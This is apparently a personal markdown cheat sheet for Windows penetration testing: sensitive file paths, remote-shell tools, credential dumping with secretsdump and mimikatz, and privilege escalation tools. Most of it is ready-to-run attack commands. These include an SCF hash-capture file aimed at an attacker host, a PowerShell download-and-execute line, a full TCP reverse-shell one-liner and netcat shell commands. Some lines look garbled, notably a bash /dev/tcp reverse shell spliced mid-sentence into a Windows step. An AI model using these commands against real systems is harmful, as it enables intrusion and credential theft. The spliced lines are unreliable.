# Windows

## File locations
| Path | Why |
| - | - |
| C:\ or other system roots | Always worth checking.
| C:\Users{\Administrator\ | Check out the users folders. |
| C:\User\[anyuser]\AppData | Lots of interesting stuff. |
| C:\Users\[anyuser]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine | Check for file 'ConsoleHost_history.txt', PS command history. |
| C:\Windows\system32\config\ | Location of the SAM/SYSTEM files. |
| C:\Windows\Repair\ | Possible SAM/SYSTEM backup. |
| C:\Windows\System32\config\RegBack | Possible SAM/SYSTEM backup. |
| C:\Windows\system32\cmd.exe | For usage in scripts etc. |
| C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe | Location of powershell, for usage in scripts etc. |
| C:\Windws\temp | Usually writeable globally. |
| C:\Windows\system32\drivers\etc\hosts | Hosts file. |
| C:\Windows\System32\spool\drivers\color | By default whitelisted dir(Applocker). |

## Connecting remotely
### Impacket
A collection of networking tools from SecureAuth.

- [Github](https://github.com/SecureAuthCorp/impacket)
- [About impacket](https://www.secureauth.com/labs/open-source-tools/impacket/)

`pip3 install impacket`

**psexec.py**

Will land you a psexec-like shell if possible.

```
psexec.py [domain]/[username]:[password]@[targetip]
psexec.py [domain]/[username]@[targetip] -hashes [NTLM-hash]
```

More impacket tools under [Credentials](#credentials).
### evil-winrm
Gets you a WinRM shell.

- [Github](https://github.com/Hackplayers/evil-winrm)

`gem install evil-winrm`

```
evil-winrm -i [targetip] -u [username] -p [password]
evil-winrm -i [targetip] -u [username] -H [NT-hash]
```

### PsExec
- (PsExec)[https://docs.microsoft.com/en-us/sysinternals/downloads/psexec]
Use this command to escalate from Administrator to System.

`.\PsExec64.exe -accepteula -i -s C:\MyRevShell.exe`

## SFC/SMB attack
Ref: [Link](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

This enables you to get a NetNTLMv2 hash for users. You have to be able to upload a file to target. When a user browses the folder in explorer, they will connect over SMB and send their password hash for authentication.

Steps:
- Create and upload a '.sfc' file, filename beginning with '@'.
- Set up a listener, responder or smbserver.py.
- Wait for a user to trigger the link by browsing.
- Crack the hash or use it as PTH.

File content:
```
[Shell]
Command=2
[IconFile]=\\*ATTACKERIP*\share\bad.ico
[Taskbar]
Command=ToggleDesktop
```

## SMB
`smbserver.py [sharename] [sharepath]`

`copy \\Address\sharename\file destination path`

## winexe
`winexe -U USER%PASSWORD [--system] //IP cmd.exe`

`pth-winexe -U 'USER%LM:NTLM' //IP cmd.exe`

## Credentials
**secretsdump.py (impacket)**

Can dump hashes and plaintext passwords remotely.

`secretsdump.py [domain]/[username]:[password]@[targetip] -dc-ip [dcip]`

**msf meterpreter**
`hashdump`

### mimikatz
Can be used to extract passwords, hashes, tickets etc.

- [Github](https://github.com/gentilkiwi/mimikatz/wiki)

Runs on target, upload binary and run.

```
sekurlsa::logonpasswords
```

`python3 /usr/share/creddump7/pwdump.py SYSTEM SAM`

#### ProTip
NTLM hash that starts with 31d6 is an empty string, which probably means that the user has now password or cannot log in.

## Reverse shell
### PowerShell
Retrieve and run a powershell script from your webserver:

`powershell IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");`

shell.ps1:Get-Service | Where-Object {$_.Status -eq "Running"}

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.37',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Enumeration
### Registry
Check for autorun apps in registry:

`reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

Wide search for passwords:

`reg query HKLM /f password /t REG_SZ /s`
`reg query HKCU /f password /t REG_SZ /s`

Saved putty sessions:
- Check for available users:
`reg query HKCU\Software`
- Check user registry for saved PuTTY session entries:
`reg query HKCU\Software\*USER*\PuTTY /t REG_SZ /s`

Saved default logon sessions:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" /t REG_SZ`

#### AlwaysInstallElevated
Check for MSI as elevated possibility:

`reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
`reg query HKCU\Software\Policies\Microsoft\Windows\Installer`

REG_DWORD 0x1 is True.

`msiexec /quiet /qn /i C:\revsh.msi`

## Vulnerability scanning
### Windows exploit suggester
- [windows-exploit-suggester(python3 fork)](https://github.com/1uffyD9/Windows-Exploit-Suggester)
- [original github using python2](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

## Privilege escalation
- [Abusing tokens](https://www.exploit-db.com/papers/42556)
- [Docs about access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)

### JuicyPotato
[Github](https://github.com/ohpe/juicy-potato)

**Create a remote shell**
Requires nc.exe.

`.\juicypotato.exe -l 1234 -p script.bat -t [* | t | u]`

Create the script on the host with:bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

`echo START C:\<pathtofolder\nc.exe -e powershell [ip] [port] > script.bat`

t-option:

![t-option](assets/markdown-img-paste-20210821204619795.png)

[cls-ids](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) in case you need it.

## nishang
https://github.com/samratashok/nishang

```
pwsh
import-module .\nishang.psm1
Get-Information
```

## PowerUp
- https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
-

`. .\PowerUp.ps1`

`Invoke-AllChecks`

## SharpUp
C# similiar to PowerUp.
- https://github.com/GhostPack/SharpUp
- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe

## Seatbelt
- https://github.com/GhostPack/Seatbelt
- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe

`seatbelt.exe all`

## winPEAS
- https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

To enable colors, if RDP.

`reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

```
-h
quiet # no banner
info
fast
systeminfo
processinfo
servicesinfo
applicationsinfo
```

## accesschk.exe
`.\accesschk.exe /accepteula -uwcqv *user* *service*`

`.\accesschk.exe /accepteula -uwdq *user* *folder*`

`.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\*service*`
